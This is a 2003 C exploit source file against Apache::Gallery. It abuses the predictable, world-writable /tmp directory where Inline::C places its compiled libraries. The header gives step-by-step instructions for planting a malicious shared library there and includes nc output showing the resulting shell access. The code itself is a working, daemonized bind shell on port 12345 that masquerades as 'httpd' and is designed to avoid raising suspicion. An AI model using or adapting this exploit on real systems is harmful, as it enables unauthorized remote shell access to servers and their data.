/**
 * Gallery_4033.c .  Local webserver compromise.
 *
 * Written by:
 * 
 * Jon Hart <warchild@spoofed.org>
 *
 * Apache::Gallery improperly uses Inline::C and creates 
 * runtime shared libraries in a predictable, world-writable
 * directory, namely /tmp.  This is because of the call to 
 * File::Spec->tmpdir() almost always returns /tmp.
 *
 * In my setup, the shared libraries are _always_ in:
 *
 * /tmp/lib/auto/Apache/Gallery_4033
 *
 * First, get the .inl and .bs files from the above directory (or 
 * whatever directory).  You'll need them later.
 *
 * Next, somehow get that directory cleared.  This is usually done
 * at reboot on many UNIX operating systems, so unless you are feeling 
 * overly creative, you'll have to wait 'til then.
 *
 * Create the appropriate directory:
 *
 * 	mkdir -p	/tmp/lib/auto/Apache/Gallery_4033
 *
 * Compile this as a shared library:
 *
 * 	`gcc -shared -fPIC -o /tmp/lib/auto/Apache/Gallery_4033/Gallery_4033.so Gallery_4033.c`
 *
 * Strip it:
 * 	`strip /tmp/lib/auto/Apache/Gallery_4033/Gallery_4033.so`
 *
 * And copy in the .inl and .bs files you stole earlier.
 *
 * And wait for someone to view the gallery.  Or do it yourself.  
 * You'll now have a nice shell listening on port 12345.  Should compile
 * and run on linux, *bsd and Solaris.
 *
 * $  nc localhost 12345    
 * id;
 * uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
 *
 *
 * Copyright (c) 2003, Jon Hart 
 * All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without modification, 
 *  are permitted provided that the following conditions are met:
 *
 *  * Redistributions of source code must retain the above copyright notice, 
 *    this list of conditions and the following disclaimer.
 *  * Redistributions in binary form must reproduce the above copyright notice, 
 *    this list of conditions and the following disclaimer in the documentation 
 *    and/or other materials provided with the distribution.
 *  * Neither the name of the organization nor the names of its contributors may
 *    be used to endorse or promote products derived from this software without 
 *    specific prior written permission.
 *
 *
 *  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" 
 *  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE 
 *  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE 
 *  ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE 
 *  LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL 
 *  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR 
 *  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER 
 *  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, 
 *  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE 
 *  USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */


#define PORT 12345
#include <stdio.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>

/** these are the only two functions that
 * A::G is expecting, so make it happy and provide
 * them.  Receiving and returning void (instead of actually 
 * following the function specs) seems to be more practical
 * because views to the gallery will just hang instead of flop,
 * thereby not raising as much suspicion.
 */
void resizepicture(void) {
	bindshell();
	exit(EXIT_SUCCESS);
}

void boot_Apache__Gallery_4033(void) {
	bindshell();
	exit(EXIT_SUCCESS);
}

/* Bind /bin/sh to PORT.  It forks
 * and all that good stuff, so it won't 
 * easily go away.
 */
int bindshell() {

	int sock_des, sock_client, sock_recv, sock_len, server_pid, client_pid;
	struct sockaddr_in server_addr; 
	struct sockaddr_in client_addr;

	if ((sock_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
		exit(EXIT_FAILURE); 

	bzero((char *) &server_addr, sizeof(server_addr));
	server_addr.sin_family = AF_INET; 
	server_addr.sin_addr.s_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons(PORT);

	if ((sock_recv = bind(sock_des, (struct sockaddr *) &server_addr, sizeof(server_addr))) != 0) 
		exit(EXIT_FAILURE); 
	if (fork() != 0) 
		exit(EXIT_SUCCESS); 
	setpgrp();  
	signal(SIGHUP, SIG_IGN); 
	if (fork() != 0) 
		exit(EXIT_SUCCESS); 
	if ((sock_recv = listen(sock_des, 5)) != 0)
		exit(EXIT_SUCCESS); 
	while (1) { 
		sock_len = sizeof(client_addr);
		if ((sock_client = accept(sock_des, (struct sockaddr *) &client_addr, &sock_len)) < 0)
			exit(EXIT_SUCCESS); 
		client_pid = getpid(); 
		server_pid = fork(); 
		if (server_pid != 0) { 
			dup2(sock_client,0); 
			dup2(sock_client,1); 
			dup2(sock_client,2);

			/* Start the shell, but call
			 * it 'httpd'.  Actually, this seems to get
			 * overwritten with the name of the parent process
			 * anyway.  w00t.
			 */
			execl("/bin/sh","httpd",(char *)0); 
			close(sock_client); 
			exit(EXIT_SUCCESS); 
		} 
		close(sock_client);
	}
}

